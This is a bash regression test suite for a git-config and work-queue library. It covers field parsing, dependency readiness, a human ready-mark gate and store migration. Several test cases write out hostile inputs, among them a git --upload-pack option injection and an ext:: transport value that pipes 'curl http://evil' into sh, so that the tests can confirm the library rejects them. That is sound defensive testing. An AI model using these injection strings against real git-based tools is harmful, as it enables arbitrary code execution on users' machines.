#!/usr/bin/env bash
# Regression table for scripts/hero-lib.sh.
#
# Scoped deliberately: only the two functions with real failure modes are
# covered — hero_field (parses attacker-controlled repo content and feeds it to
# git/gh) and hero_ready_items (parses hand-written frontmatter and previously
# aborted the caller's shell on it). The thin wrappers around them are not
# tested; a test there would pin prose, not behavior.
#
# Every case below is one that was, or could again be, WRONG SILENTLY — the
# listing coming back empty, a value truncated, a malformed id taking the whole
# function down. Loud failures need no regression table.
#
# Usage: bash scripts/hero-lib.test.sh

set -uo pipefail

LIB="$(cd "$(dirname "$0")" && pwd)/hero-lib.sh"
# shellcheck source=/dev/null
. "$LIB" || { echo "cannot source $LIB"; exit 1; }

PASS=0
FAIL=0

check() { # name expected actual
  if [ "$2" = "$3" ]; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
    printf 'FAIL  %s\n      expected: [%s]\n      actual:   [%s]\n' "$1" "$2" "$3"
  fi
}

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

# ---------- hero_field -----------------------------------------------------

mkdir -p "$TMP/cfg"
cat > "$TMP/cfg/HERO.md" <<'EOF'
# Hero Configuration

## Repository

- default-branch: main # the trunk
- quoted-value: "develop"
- empty-value:
- spaced-value:    padded
EOF

check "field: strips trailing comment" \
  "main" "$(hero_field default-branch "$TMP/cfg")"
check "field: strips surrounding quotes" \
  "develop" "$(hero_field quoted-value "$TMP/cfg")"
check "field: trims padding" \
  "padded" "$(hero_field spaced-value "$TMP/cfg")"

hero_field absent-key "$TMP/cfg" >/dev/null 2>&1
check "field: absent returns 1" "1" "$?"

hero_field empty-value "$TMP/cfg" >/dev/null 2>&1
check "field: present-but-empty returns 1" "1" "$?"

# Option injection: a value beginning with `-` reaches git as an OPTION.
# `git fetch origin --upload-pack=<cmd>` executes <cmd> through a shell, so a
# checked-in HERO.md in a cloned repo becomes arbitrary code execution.
cat > "$TMP/cfg/HERO.md" <<'EOF'
- default-branch: --upload-pack=touch /tmp/hero_lib_test_pwned;git-upload-pack
EOF
hero_field default-branch "$TMP/cfg" >/dev/null 2>&1
check "field: rejects leading-dash value (option injection)" "2" "$?"
check "field: rejected value falls back to main" \
  "main" "$(hero_default_branch "$TMP/cfg" 2>/dev/null)"

# ---------- hero_normalize_repo_ref ----------------------------------------
#
# target-repo flows from HERO.md into `git ls-remote`/`git clone` as a URL.
# hero_field blocks leading-dash/control-chars but NOT git's `ext::` transport
# helper, which executes a shell command — the RCE this gate exists to stop.

# The exploit shape: passes hero_field, must be rejected here.
hero_normalize_repo_ref 'ext::sh -c "curl http://evil|sh"' >/dev/null 2>&1
check "repo-ref: rejects ext:: transport helper (RCE)" "2" "$?"
hero_normalize_repo_ref 'file:///etc' >/dev/null 2>&1
check "repo-ref: rejects file:// transport" "2" "$?"
hero_normalize_repo_ref 'ftp://host/x' >/dev/null 2>&1
check "repo-ref: rejects unknown URL scheme" "2" "$?"
hero_normalize_repo_ref 'no-such-dir/that/is/deep' >/dev/null 2>&1
check "repo-ref: rejects a bare non-existent path" "2" "$?"

# Accepted forms, normalized on stdout.
check "repo-ref: OWNER/NAME expands to a github URL" \
  "https://github.com/acme/widgets" "$(hero_normalize_repo_ref 'acme/widgets')"
check "repo-ref: https URL passes through" \
  "https://example.com/x.git" "$(hero_normalize_repo_ref 'https://example.com/x.git')"
check "repo-ref: scp-style ssh passes through" \
  "git@github.com:acme/widgets.git" "$(hero_normalize_repo_ref 'git@github.com:acme/widgets.git')"
check "repo-ref: none passes through unchanged" \
  "none" "$(hero_normalize_repo_ref none)"
check "repo-ref: an existing local dir passes through" \
  "$TMP/cfg" "$(hero_normalize_repo_ref "$TMP/cfg")"

# ---------- hero_ready_items -----------------------------------------------

W="$TMP/w/.plans"
mkdir -p "$W"

item() { # file id title status deps [kind]
  {
    printf -- '---\nid: %s\n' "$2"
    if [ -n "${6:-}" ]; then printf 'kind: %s\n' "$6"; fi
    printf 'title: %s\nstatus: %s\ndepends_on: %s\n---\n' "$3" "$4" "$5"
  } > "$W/$1"
}

item 001-done.md 1 "Finished" "done" "[]"
item 002-todo.md 2 "Unblocked" "todo" "[1]"
item 003-blocked.md 3 "Waiting" "todo" "[2]"
item 004-active.md 4 "In flight" "in-progress" "[1]"
item 005-pad.md 007 "Zero padded" "done" "[]"
item 006-padref.md 6 "Refs padded id" "todo" "[7]"
item 007-dangling.md 8 "Dangling ref" "todo" "[99]"
item 008-caps.md 9 "Capitalized status" "DONE" "[]"

OUT="$(hero_ready_items "$W" 2>/dev/null)"

# state_of FILE [LISTING] — the STATE column for FILE, defaulting to $OUT.
state_of() { printf '%s' "${2:-$OUT}" | awk -v f="$1" '$2 == f { print $1; exit }'; }

check "ready: satisfied dep is READY"        "READY"   "$(state_of 002-todo.md)"
check "ready: unmet dep is blocked"          "blocked" "$(state_of 003-blocked.md)"
check "ready: in-progress is active, not READY" "active" "$(state_of 004-active.md)"
check "ready: done items are listed"         "done"    "$(state_of 001-done.md)"
# 007 and 7 must compare equal, or a zero-padded legacy id blocks its dependents.
check "ready: zero-padded id resolves"       "READY"   "$(state_of 006-padref.md)"
# A dangling reference must block, not silently resolve — and must SAY it is
# dangling: nothing will ever mark a nonexistent id done, so an unnamed
# dangling ref reads as ordinary waiting when it is actually forever.
check "ready: dangling dep blocks"           "blocked" "$(state_of 007-dangling.md)"
printf '%s' "$OUT" | grep -q '007-dangling.md.*\[missing dep: 99\]'
check "ready: dangling dep is named on the listing" "0" "$?"
# Capture stderr rather than piping into grep -q: with pipefail, grep's early
# exit SIGPIPEs the producer and the pipeline reports 141 despite a match.
ERR0="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR0" | grep -q "no item carries"
check "ready: dangling dep warns on stderr" "0" "$?"
# `DONE` must count as done, or every dependent stays blocked forever.
check "ready: status match is case-insensitive" "done"  "$(state_of 008-caps.md)"

# Ids are integers by convention, but a hand-written oddball must degrade
# gracefully: a non-numeric id used to be a FATAL arithmetic error that
# emitted NOTHING — a caller reads that as an empty plate, not as a failure.
item 009-strid.md "AH-12" "String id" "done" "[]"
item 00a-strdep.md "b3f2" "Depends on string id" "todo" "[ah-12]"
OUT2="$(hero_ready_items "$W" 2>/dev/null)"
COUNT2="$(printf '%s' "$OUT2" | grep -c . )"
check "ready: string id does not blank the listing" "10" "$COUNT2"
# Ids compare case-insensitively — `ah-12` must resolve against `AH-12`.
check "ready: string-id dep resolves case-insensitively" "READY" "$(state_of 00a-strdep.md "$OUT2")"

# The store listing is data; notes belong on stderr.
NOTE="$(hero_ready_items "$TMP/nonexistent-store" 2>/dev/null)"
check "ready: missing store prints nothing to stdout" "" "$NOTE"

# Sourced into a caller's shell, a bare `cd` reroutes every later relative path.
BEFORE="$PWD"
hero_ready_items "$W" >/dev/null 2>&1
check "ready: does not change caller's cwd" "$BEFORE" "$PWD"

# ---------- hero_item_field ------------------------------------------------

cat > "$W/010-colon.md" <<'EOF'
---
id: 10
title: Fix auth: token refresh
status: todo
depends_on: []
success: e2e green: login under 30s
---
EOF

# Splitting on every ': ' truncated any value containing a colon — and
# `success` is the field Step 1c reads to decide whether to build.
check "item_field: title keeps its colon" \
  "Fix auth: token refresh" "$(hero_item_field "$W/010-colon.md" title)"
check "item_field: success keeps its colon" \
  "e2e green: login under 30s" "$(hero_item_field "$W/010-colon.md" success)"

# ---------- silent-READY regressions ---------------------------------------
#
# Each of these reported an item as READY (or its dependent as permanently
# blocked) with nothing on stderr — an agent would have picked up work whose
# dependencies do not exist, or skipped work that was actually unblocked.

cat > "$W/011-mldeps.md" <<'EOF'
---
id: 11
title: Block sequence deps
status: todo
depends_on:
  - 99
  - 100
---
EOF
# YAML block sequences are the standard list form. Only the inline form parsed,
# so this yielded "no dependencies" and the item was handed out as READY.
OUT3="$(hero_ready_items "$W" 2>/dev/null)"
check "deps: block sequence blocks" "blocked" "$(state_of 011-mldeps.md "$OUT3")"

cat > "$W/012-quoted.md" <<'EOF'
---
id: 12
title: Quoted status
status: "done"
depends_on: []
---
EOF
cat > "$W/013-dep.md" <<'EOF'
---
id: 13
title: Depends on the quoted-done item
status: todo
depends_on: [12]
---
EOF
item 015-qdep.md 15 "Quoted inline dep" "todo" '["12"]'
OUT4="$(hero_ready_items "$W" 2>/dev/null)"
# A quoted status did not equal `done`, so every dependent blocked forever.
check "status: quoted done counts as done" "done"  "$(state_of 012-quoted.md "$OUT4")"
check "status: its dependent unblocks"     "READY" "$(state_of 013-dep.md "$OUT4")"
# The inline-array parser must strip entry quotes like the block parser does,
# or `depends_on: ["12"]` emits `"12"` and never matches id 12.
check "deps: quoted inline entry resolves" "READY" "$(state_of 015-qdep.md "$OUT4")"

cat > "$W/014-body.md" <<'EOF'
---
id: 14
title: Body mentions a status
depends_on: []
---

Run until `status: done` appears in the log.
EOF
OUT5="$(hero_ready_items "$W" 2>/dev/null)"
# Frontmatter only — a body line must not be read as the item's own field.
check "field: body line is not frontmatter" "READY" "$(state_of 014-body.md "$OUT5")"

hero_ready_items "$TMP/definitely-not-a-store" >/dev/null 2>&1
check "ready: missing store returns non-zero" "1" "$?"

# An empty store is a healthy empty plate, not a failure (zsh aborted here
# with a raw unmatched-glob error and rc=1 before nullglob was set).
mkdir -p "$TMP/empty-store"
EMPTY="$(hero_ready_items "$TMP/empty-store" 2>/dev/null)"
check "ready: empty store returns success" "0" "$?"
check "ready: empty store prints nothing" "" "$EMPTY"

# ---------- id integrity -----------------------------------------------------
#
# The space-delimited id sets are only sound if no id can contain the
# delimiter. A whitespace id (`id: AH 12`) used to inject two tokens, letting
# a dep on a NONEXISTENT id resolve — and count as done — with no warning:
# the exact silent-READY failure the dangling-dep report exists to prevent.

item 016-wsid.md "WS tok9" "Whitespace id" "done" "[]"
item 017-wsdep.md 17 "Deps on token of whitespace id" "todo" "[tok9]"
OUT6="$(hero_ready_items "$W" 2>/dev/null)"
ERR6="$(hero_ready_items "$W" 2>&1 >/dev/null)"
check "ready: dep on a whitespace-id token stays blocked" "blocked" "$(state_of 017-wsdep.md "$OUT6")"
printf '%s' "$ERR6" | grep -q "whitespace-containing id"
check "ready: whitespace id warns on stderr" "0" "$?"

# Duplicate ids (after normalization — 007 is already item 005's id) must be
# named: dependents may resolve against the wrong twin.
item 018-dup7.md 7 "Duplicate of padded id 007" "todo" "[]"
ERR7="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR7" | grep -q "duplicate id 7"
check "ready: normalized duplicate id warns on stderr" "0" "$?"

# An item with no usable id cannot participate in dependency order — handing
# it out as READY would have a consumer work an item nothing can depend on.
printf 'just prose, no frontmatter\n' > "$W/019-prose.md"
OUT7="$(hero_ready_items "$W" 2>/dev/null)"
check "ready: id-less item is invalid, not READY" "invalid" "$(state_of 019-prose.md "$OUT7")"

# discovered_from is provenance, never a blocker: a DANGLING discovered_from
# must not block (or even warn) — the readiness engine only parses depends_on.
cat > "$W/020-disc.md" <<'EOF'
---
id: 20
title: Discovered while working another item
status: todo
depends_on: []
discovered_from: 999
---
EOF
OUT8="$(hero_ready_items "$W" 2>/dev/null)"
check "ready: dangling discovered_from never blocks" "READY" "$(state_of 020-disc.md "$OUT8")"

# ---------- planning gate ----------------------------------------------------
#
# The planning state is the human ready-mark gate: emitted items sit in
# `planning` until a person flips them to `todo`. Each case here pins a way the
# gate could be silently defeated — an emitted item handed to one-shot with no
# ready-mark, the precise silent-READY shape this table exists to catch.

item 021-planning.md 21 "Awaiting ready-mark" "planning" "[1]"
item 022-plandep.md 22 "Depends on a planning item" "todo" "[21]"
cat > "$W/023-qplan.md" <<'EOF'
---
id: 23
title: Quoted planning
status: "planning"
depends_on: []
---
EOF
item 024-capplan.md 24 "Capitalized planning" "Planning" "[]"
# `plan` is the display LABEL, `planning` the keyword — an intuitive-but-wrong
# shortening that previously fell through to READY, defeating the whole gate.
item 025-typo.md 25 "Status typo" "plan" "[1]"
OUT9="$(hero_ready_items "$W" 2>/dev/null)"
# Planning items list as `plan`, never READY, even with every dependency done.
check "planning: item lists as plan, not READY" "plan"    "$(state_of 021-planning.md "$OUT9")"
check "planning: quoted planning counts"        "plan"    "$(state_of 023-qplan.md "$OUT9")"
check "planning: capitalized planning counts"   "plan"    "$(state_of 024-capplan.md "$OUT9")"
# A dependent of a planning item stays blocked (the id EXISTS — it is just not
# done — so this is ordinary blocking, NOT a dangling-ref).
check "planning: dependent stays blocked"       "blocked" "$(state_of 022-plandep.md "$OUT9")"
printf '%s' "$OUT9" | grep -q '022-plandep.md.*\[missing dep:'
check "planning: dependent is not mislabeled dangling" "1" "$?"
# An UNRECOGNIZED status (the `plan` typo) must be invalid, never READY.
check "planning: unknown status is invalid, not READY" "invalid" "$(state_of 025-typo.md "$OUT9")"
ERR9="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERR9" | grep -q "unrecognized status 'plan'"
check "planning: unknown status warns on stderr" "0" "$?"

# ---------- feature lifecycle (kind: feature) --------------------------------
#
# Wayfare features carry the extended enum todo|planning|ready|implementing|
# reviewing|done. Each case pins a way the mapping could silently regress: a
# `todo` feature handed to one-shot unplanned (backlog must never be READY),
# or the extended statuses leaking into plain items (they must stay invalid).

# Feature-item fixture: `item` with kind defaulted to `feature`.
fitem() { item "$1" "$2" "$3" "$4" "$5" "${6:-feature}"; }

fitem 030-backlog.md 30 "Unplanned feature" "todo" "[]"
fitem 031-fplan.md 31 "Feature being planned" "planning" "[]"
fitem 032-fready.md 32 "Planned and marked ready" "ready" "[1]"
fitem 033-fblocked.md 33 "Ready but blocked" "ready" "[30]"
fitem 034-fimpl.md 34 "Being built" "implementing" "[]"
fitem 035-flegacy.md 35 "Legacy in-progress feature" "in-progress" "[]"
fitem 036-frev.md 36 "PR in review" "reviewing" "[]"
fitem 037-fdone.md 37 "Shipped feature" "done" "[]"
fitem 038-fcaps.md 38 "Capitalized kind" "todo" "[]" "Feature"
fitem 039-ftypo.md 39 "Feature status typo" "in-review" "[]"
# The extended enum is features-only: a PLAIN item claiming `ready` must stay
# invalid — otherwise any item could skip the human ready-mark by declaring it.
item 040-plainready.md 40 "Plain item claiming ready" "ready" "[]"
OUTF="$(hero_ready_items "$W" 2>/dev/null)"
# A todo feature is on the roadmap but UNPLANNED — never READY.
check "feature: todo lists as backlog, not READY" "backlog" "$(state_of 030-backlog.md "$OUTF")"
check "feature: planning lists as plan"           "plan"    "$(state_of 031-fplan.md "$OUTF")"
# `ready` is the feature state eligible for READY, dep-gated like plain todo.
check "feature: ready with deps done is READY"    "READY"   "$(state_of 032-fready.md "$OUTF")"
check "feature: ready with unmet dep is blocked"  "blocked" "$(state_of 033-fblocked.md "$OUTF")"
check "feature: implementing is active"           "active"  "$(state_of 034-fimpl.md "$OUTF")"
check "feature: legacy in-progress still active"  "active"  "$(state_of 035-flegacy.md "$OUTF")"
check "feature: reviewing lists as review"        "review"  "$(state_of 036-frev.md "$OUTF")"
check "feature: done is done"                     "done"    "$(state_of 037-fdone.md "$OUTF")"
check "feature: kind match is case-insensitive"   "backlog" "$(state_of 038-fcaps.md "$OUTF")"
check "feature: unknown status is invalid"        "invalid" "$(state_of 039-ftypo.md "$OUTF")"
check "feature: plain item with ready is invalid" "invalid" "$(state_of 040-plainready.md "$OUTF")"
ERRF="$(hero_ready_items "$W" 2>&1 >/dev/null)"
printf '%s' "$ERRF" | grep -q "unrecognized status 'in-review'.*kind: feature"
check "feature: unknown status names the feature enum on stderr" "0" "$?"
# Clean up so later sections' listings aren't polluted by these fixtures.
rm -f "$W"/03[0-9]-*.md "$W/040-plainready.md"

# ---------- hero_work_store migration ---------------------------------------
#
# The only mutating function: an mv of the agent's entire work queue. Each
# case pins a path a refactor of the migration loop could silently drop.

R1="$TMP/mig1"; git init -q "$R1"
mkdir "$R1/my-work"; printf -- '---\nid: 1\ntitle: L\nstatus: todo\ndepends_on: []\n---\n' > "$R1/my-work/001-x.md"
S1="$(hero_work_store "$R1" 2>/dev/null)"
check "store: returns the .plans path"     "$R1/.plans" "$S1"
check "store: legacy item migrated"        "yes" "$([ -e "$R1/.plans/001-x.md" ] && echo yes)"
check "store: legacy dir gone after move"  "yes" "$([ ! -e "$R1/my-work" ] && echo yes)"
grep -qxF ".plans/" "$R1/.git/info/exclude"
check "store: .plans excluded in the TARGET repo" "0" "$?"
check "store: second call is idempotent"   "$R1/.plans" "$(hero_work_store "$R1" 2>/dev/null)"

# Symlink refusal — only when a migration would actually happen. A stale
# legacy symlink next to a healthy .plans/ must not brick the store.
R2="$TMP/mig2"; git init -q "$R2"; ln -s /etc "$R2/my-work"
hero_work_store "$R2" >/dev/null 2>&1
check "store: symlinked legacy refused when migrating" "1" "$?"
check "store: no .plans created on refusal" "yes" "$([ ! -e "$R2/.plans" ] && echo yes)"
mkdir "$R2/.plans"
S2="$(hero_work_store "$R2" 2>/dev/null)"
check "store: healthy .plans survives a legacy symlink" "$R2/.plans" "$S2"

# Both legacy dirs: my-work (newer) wins; shadowed plan-work is warned loudly.
R3="$TMP/mig3"; git init -q "$R3"
mkdir "$R3/my-work" "$R3/plan-work"; touch "$R3/my-work/a.md" "$R3/plan-work/b.md"
ERR3="$(hero_work_store "$R3" 2>&1 >/dev/null)"
check "store: my-work wins over plan-work" "yes" "$([ -e "$R3/.plans/a.md" ] && echo yes)"
printf '%s' "$ERR3" | grep -q "both plan-work/ and .plans/ exist"
check "store: shadowed plan-work warned loudly" "0" "$?"

# Explicit-root safety: run from a NON-repo cwd, the store must land in (and
# only mutate) the target repo — previously the exclude writes hit the cwd.
R4="$TMP/mig4"; git init -q "$R4"
NOREPO="$TMP/norepo"; mkdir -p "$NOREPO"
S4="$(cd "$NOREPO" && hero_work_store "$R4" 2>/dev/null)"
check "store: explicit root works from non-repo cwd" "$R4/.plans" "$S4"
grep -qxF ".plans/" "$R4/.git/info/exclude"
check "store: excludes written to the target repo" "0" "$?"
hero_work_store "$NOREPO" >/dev/null 2>&1
check "store: non-repo root still refused" "1" "$?"

# ---------- branch-name gate -----------------------------------------------
#
# hero_field's character gate cannot catch a value that is a valid STRING but
# not a valid BRANCH: git reads these as something other than the branch they
# resemble. This gate existed but was never wired to a caller.

branch_case() { # value expected
  printf '# H\n\n- default-branch: %s\n' "$1" > "$TMP/cfg/HERO.md"
  check "branch: $1" "$2" "$(hero_default_branch "$TMP/cfg" 2>/dev/null)"
}
branch_case "main:refs/heads/evil" "main"
branch_case "main^"                "main"
branch_case "@{u}"                 "main"
branch_case ".."                   "main"
branch_case "develop"              "develop"
branch_case "release/2.0"          "release/2.0"

# ---------- report ---------------------------------------------------------

if [ "$FAIL" -gt 0 ]; then
  echo "hero-lib: $PASS passed, $FAIL FAILED"
  exit 1
fi
echo "hero-lib: $PASS passed"
